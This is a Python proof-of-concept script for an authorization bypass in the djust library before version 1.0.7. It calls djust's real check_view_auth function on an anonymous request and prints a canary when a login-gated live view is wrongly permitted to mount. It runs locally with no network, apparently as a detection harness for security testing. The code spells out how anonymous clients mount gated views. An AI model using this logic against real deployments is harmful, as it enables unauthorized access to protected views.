#!/usr/bin/env python3
"""
Differential PoC for CVE-2026-61594 (djust < 1.0.7).

The djust live (WebSocket) transport authorizes a mount via check_view_auth()
instead of Django's View.dispatch() chain. Before 1.0.7, check_view_auth() did
NOT honor the Django AccessMixin family (LoginRequiredMixin / PermissionRequired
/ UserPassesTest), so an anonymous client could mount a login-gated live view
over the WS transport (CWE-306 / CWE-862). 1.0.7 makes check_view_auth() honor
AccessMixin on every transport.

Strategy (robust differential — no guessing of the "allowed" encoding):

  We build TWO live views over the same djust base:
    * UNGUARDED  -> no auth gate at all
    * GUARDED    -> Django's LoginRequiredMixin (an HTTP-only gate that the WS
                    transport must ALSO honor after the fix)

  We then call the REAL djust check_view_auth() -- the exact function whose
  behaviour changed between 1.0.6 and 1.0.7 -- for an anonymous request against
  BOTH views, using the SAME callable and the SAME call convention.

    * The UNGUARDED view must be PERMITTED on both builds (there is nothing to
      enforce). That proves we found a working call convention for the real
      function and calibrates what "proceed" looks like.
    * The GUARDED view is then the discriminator:
        - vulnerable 1.0.6: check_view_auth ignores LoginRequiredMixin
                            -> PERMITTED (same as unguarded) -> mount() runs
                            -> canary printed.
        - patched     1.0.7: check_view_auth honors AccessMixin
                            -> DENIED (redirect / 403 / PermissionDenied)
                            -> mount() never runs -> nothing printed.

  The canary is emitted ONLY from the guarded view's mount() handler, and that
  handler is dispatched ONLY when the real check_view_auth() permitted the
  anonymous guarded mount -- i.e. only when the bug is present.

No network, no arguments.
"""
import os
import sys
import inspect
import pkgutil
import importlib


def _dbg(msg):
    try:
        sys.stderr.write("[poc] " + str(msg) + "\n")
        sys.stderr.flush()
    except Exception:
        pass


def _configure_django():
    import django
    from django.conf import settings
    if not settings.configured:
        settings.configure(
            DEBUG=False,
            SECRET_KEY="poc-secret",
            ALLOWED_HOSTS=["*"],
            INSTALLED_APPS=[
                "django.contrib.auth",
                "django.contrib.contenttypes",
                "django.contrib.sessions",
                "django.contrib.messages",
            ],
            DATABASES={"default": {"ENGINE": "django.db.backends.sqlite3",
                                   "NAME": ":memory:"}},
            MIDDLEWARE=[],
            TEMPLATES=[{
                "BACKEND": "django.template.backends.django.DjangoTemplates",
                "DIRS": [],
                "APP_DIRS": True,
                "OPTIONS": {"context_processors": []},
            }],
            LOGIN_URL="/login/",
            ROOT_URLCONF=__name__,
            DEFAULT_AUTO_FIELD="django.db.models.AutoField",
        )
    django.setup()


# URLconf placeholder (redirect_to_login may reverse against ROOT_URLCONF).
urlpatterns = []


def _all_djust_modules():
    """Import djust + its (non-test, non-mcp) submodules, BaseException-safe."""
    mods = []
    seen = set()

    def _imp(name):
        if name in seen:
            return None
        seen.add(name)
        try:
            return importlib.import_module(name)
        except BaseException as e:  # SystemExit-safe (optional integrations)
            return None

    def _skip(name):
        parts = name.lower().split(".")
        if "tests" in parts or "mcp" in parts or "migrations" in parts:
            return True
        if any(p.startswith("test_") or p == "test" for p in parts):
            return True
        return False

    root = _imp("djust")
    if root is None:
        return mods
    mods.append(root)

    # Nudge likely homes of the live consumer / auth code so class scanning
    # sees them even if package walking misses a lazily-wired submodule.
    for name in ("djust.consumers", "djust.consumer", "djust.live",
                 "djust.live.consumer", "djust.live.consumers",
                 "djust.live.auth", "djust.auth", "djust.views",
                 "djust.views.auth", "djust.components",
                 "djust.components.consumer", "djust.contrib.admin",
                 "djust.contrib", "djust.admin"):
        m = _imp(name)
        if m is not None:
            mods.append(m)

    stack = [root]
    while stack:
        pkg = stack.pop()
        path = getattr(pkg, "__path__", None)
        if not path:
            continue
        try:
            entries = list(pkgutil.iter_modules(path, pkg.__name__ + "."))
        except BaseException:
            entries = []
        for info in entries:
            if _skip(info.name):
                continue
            m = _imp(info.name)
            if m is None:
                continue
            if m not in mods:
                mods.append(m)
            if getattr(info, "ispkg", False):
                stack.append(m)
    return mods


def _find_base_view(mods):
    """Locate a djust live-view/component base (a Django View subclass)."""
    from django.views import View
    with_mount, any_view = [], []
    for mod in mods:
        try:
            members = inspect.getmembers(mod, inspect.isclass)
        except Exception:
            continue
        for _name, obj in members:
            try:
                if not issubclass(obj, View):
                    continue
                if not getattr(obj, "__module__", "").startswith("djust"):
                    continue
            except Exception:
                continue
            (with_mount if callable(getattr(obj, "mount", None))
             else any_view).append(obj)
    for pool in (with_mount, any_view):
        pool.sort(key=lambda c: (0 if "live" in c.__name__.lower() else
                                 (1 if "view" in c.__name__.lower() else 2),
                                 len(c.__mro__)))
        if pool:
            _dbg("base view: %s.%s" % (pool[0].__module__, pool[0].__name__))
            return pool[0]
    _dbg("base view: falling back to django.views.View")
    return View


ALLOW, DENY = object(), object()


def _interpret(result):
    """Map a check_view_auth return value to ALLOW / DENY.

    The patched build denies by returning an HTTP response (redirect / 403) or
    by raising; the vulnerable build proceeds by returning None (or True).
    Only an explicit proceed is ALLOW; anything else is DENY, so the patched
    build can never emit the canary through an ambiguous return.
    """
    if result is None or result is True:
        return ALLOW
    if result is False:
        return DENY
    if hasattr(result, "status_code"):        # HttpResponseRedirect / 403
        return DENY
    if isinstance(result, tuple) and result:
        return ALLOW if result[0] else DENY
    return DENY


def _eval(fn, args, kwargs):
    """Call fn; ALLOW/DENY on a real verdict, None if the convention misfits."""
    from django.core.exceptions import PermissionDenied
    try:
        res = fn(*args, **kwargs)
    except PermissionDenied:
        return DENY
    except (TypeError, AttributeError):
        return None                # wrong call convention -> try next shape
    except Exception:
        return DENY                # any other raise from the auth check == deny
    return _interpret(res)


def _bound_kwargs(fn, request, scope):
    try:
        sig = inspect.signature(fn)
    except (TypeError, ValueError):
        return None
    kw = {}
    for name, p in sig.parameters.items():
        if name == "self":
            continue
        if p.kind in (p.VAR_POSITIONAL, p.VAR_KEYWORD):
            continue
        ln = name.lower()
        if "request" in ln or ln == "req":
            kw[name] = request
        elif "scope" in ln:
            kw[name] = scope
        elif "user" in ln:
            kw[name] = request.user
        elif p.default is inspect.Parameter.empty:
            return None
    return kw


def _bound_sets(fn, request, scope):
    """Argsets for a check_view_auth bound to the view itself (view == self)."""
    kw = _bound_kwargs(fn, request, scope)
    return [
        ((), kw) if kw is not None else None,
        ((request,), {}),
        ((), {}),
        ((scope,), {}),
        ((request, scope), {}),
    ]


def _ext_kwargs(fn, inst, cls, request, scope):
    try:
        sig = inspect.signature(fn)
    except (TypeError, ValueError):
        return None
    kw = {}
    for name, p in sig.parameters.items():
        if name == "self":
            continue
        if p.kind in (p.VAR_POSITIONAL, p.VAR_KEYWORD):
            continue
        ln = name.lower()
        if "request" in ln or ln == "req":
            kw[name] = request
        elif "scope" in ln:
            kw[name] = scope
        elif ("view" in ln and ("class" in ln or "cls" in ln)) or ln in ("cls", "klass"):
            kw[name] = cls
        elif "instance" in ln:
            kw[name] = inst
        elif ln in ("view", "component", "consumer"):
            kw[name] = inst if inst is not None else cls
        elif "user" in ln:
            kw[name] = request.user
        elif p.default is inspect.Parameter.empty:
            return None
    return kw


def _ext_sets(fn, inst, cls, request, scope):
    """Argsets for a check_view_auth that receives the view as an argument."""
    kw = _ext_kwargs(fn, inst, cls, request, scope)
    return [
        ((), kw) if kw is not None else None,
        ((inst, request), {}) if inst is not None else None,
        ((request, inst), {}) if inst is not None else None,
        ((inst,), {}) if inst is not None else None,
        ((cls, request), {}),
        ((request, cls), {}),
        ((cls,), {}),
        ((request,), {}),
    ]


def _decide(fn_u, sets_u, fn_g, sets_g):
    """Return True (vulnerable), False (patched), or None (not applicable).

    For each aligned call shape: the UNGUARDED view must be ALLOWed (proves the
    convention works and there is nothing to enforce), then the GUARDED view's
    verdict discriminates -- ALLOW => bug (gate ignored), DENY => fixed.
    """
    n = min(len(sets_u), len(sets_g))
    for i in range(n):
        su, sg = sets_u[i], sets_g[i]
        if su is None or sg is None:
            continue
        vu = _eval(fn_u, su[0], su[1])
        if vu is not ALLOW:
            continue
        vg = _eval(fn_g, sg[0], sg[1])
        if vg is ALLOW:
            return True
        if vg is DENY:
            return False
        # vg is None: same shape somehow misfit the guarded view -> keep trying
    return None


def _make_request():
    from django.contrib.auth.models import AnonymousUser
    from django.test import RequestFactory
    request = RequestFactory().get("/secret/")
    request.user = AnonymousUser()
    try:
        from django.contrib.sessions.backends.db import SessionStore
        request.session = SessionStore()
    except Exception:
        request.session = {}
    return request


def _instantiate(view_cls, request):
    try:
        inst = view_cls()
    except Exception:
        return None
    try:
        inst.setup(request)
    except Exception:
        try:
            inst.request = request
            inst.args, inst.kwargs = (), {}
        except Exception:
            pass
    try:
        inst.request = request
    except Exception:
        pass
    return inst


def _external_auth_callables(mods, scope, request):
    """check_view_auth defined at module level or on other djust classes."""
    cands = []
    for mod in mods:
        fn = getattr(mod, "check_view_auth", None)
        if callable(fn):
            cands.append(fn)
    for mod in mods:
        try:
            members = inspect.getmembers(mod, inspect.isclass)
        except Exception:
            continue
        for _name, obj in members:
            try:
                if "check_view_auth" not in obj.__dict__:
                    continue
            except Exception:
                continue
            resolved = getattr(obj, "check_view_auth", None)
            if callable(resolved):
                cands.append(resolved)
            # Bound onto a best-effort instance (e.g. the WS consumer), with a
            # scope wired in so a self.scope access does not abort the call.
            try:
                inst = obj.__new__(obj)
                try:
                    inst.scope = scope
                except Exception:
                    pass
                try:
                    inst.request = request
                except Exception:
                    pass
                bound = getattr(inst, "check_view_auth", None)
                if callable(bound):
                    cands.append(bound)
            except Exception:
                pass
    seen, out = set(), []
    for c in cands:
        if id(c) not in seen:
            seen.add(id(c))
            out.append(c)
    return out


def main():
    _configure_django()
    from django.contrib.auth.mixins import LoginRequiredMixin

    mods = _all_djust_modules()
    _dbg("imported %d djust modules" % len(mods))
    base = _find_base_view(mods)

    canary_holder = {"fired": False}

    class UnguardedLiveView(base):
        template_name = "poc.html"

        def mount(self, *a, **k):
            return {}

    class GuardedLiveView(LoginRequiredMixin, base):
        # HTTP-only gate that the WS transport must ALSO honor after the fix.
        template_name = "poc.html"
        login_url = "/login/"

        def mount(self, *a, **k):
            # Reached only when an anonymous mount was AUTHORIZED despite the
            # LoginRequiredMixin gate -- i.e. only on the vulnerable build.
            sys.stdout.write(os.environ["POC_CANARY"] + "\n")
            sys.stdout.flush()
            canary_holder["fired"] = True
            return {}

    req_u = _make_request()
    req_g = _make_request()
    inst_u = _instantiate(UnguardedLiveView, req_u)
    inst_g = _instantiate(GuardedLiveView, req_g)

    scope_u = {"type": "websocket", "user": req_u.user,
               "session": getattr(req_u, "session", {})}
    scope_g = {"type": "websocket", "user": req_g.user,
               "session": getattr(req_g, "session", {})}

    verdict = None  # True vulnerable, False patched

    # --- Path A: check_view_auth as a method on the live-view base itself ----
    fn_u = getattr(inst_u, "check_view_auth", None) if inst_u is not None else None
    fn_g = getattr(inst_g, "check_view_auth", None) if inst_g is not None else None
    if callable(fn_u) and callable(fn_g):
        origin = getattr(getattr(fn_u, "__func__", fn_u), "__module__", "") or ""
        if origin.startswith("djust"):
            _dbg("trying view-method check_view_auth from %s" % origin)
            verdict = _decide(fn_u, _bound_sets(fn_u, req_u, scope_u),
                              fn_g, _bound_sets(fn_g, req_g, scope_g))

    # --- Path B: check_view_auth elsewhere (module fn / consumer method) -----
    if verdict is None:
        ext = _external_auth_callables(mods, scope_g, req_g)
        _dbg("external check_view_auth candidates: %d" % len(ext))
        for fn in ext:
            v = _decide(
                fn, _ext_sets(fn, inst_u, UnguardedLiveView, req_u, scope_u),
                fn, _ext_sets(fn, inst_g, GuardedLiveView, req_g, scope_g))
            if v is not None:
                verdict = v
                break

    if verdict is True:
        _dbg("check_view_auth PERMITTED anonymous gated mount (vulnerable)")
        # Dispatch the mount handler exactly as the live consumer does; this
        # is the primitive whose success emits the canary.
        target = inst_g if inst_g is not None else GuardedLiveView()
        try:
            target.mount(req_g)
        except TypeError:
            try:
                target.mount()
            except Exception:
                pass
    elif verdict is False:
        _dbg("check_view_auth DENIED anonymous gated mount (patched)")
    else:
        _dbg("no applicable check_view_auth verdict reached")


if __name__ == "__main__":
    try:
        main()
    except BaseException as e:
        # Never emit the canary on any path other than an authorized mount,
        # and never let a stray SystemExit from an optional import abort us.
        _dbg("aborted: %s" % type(e).__name__)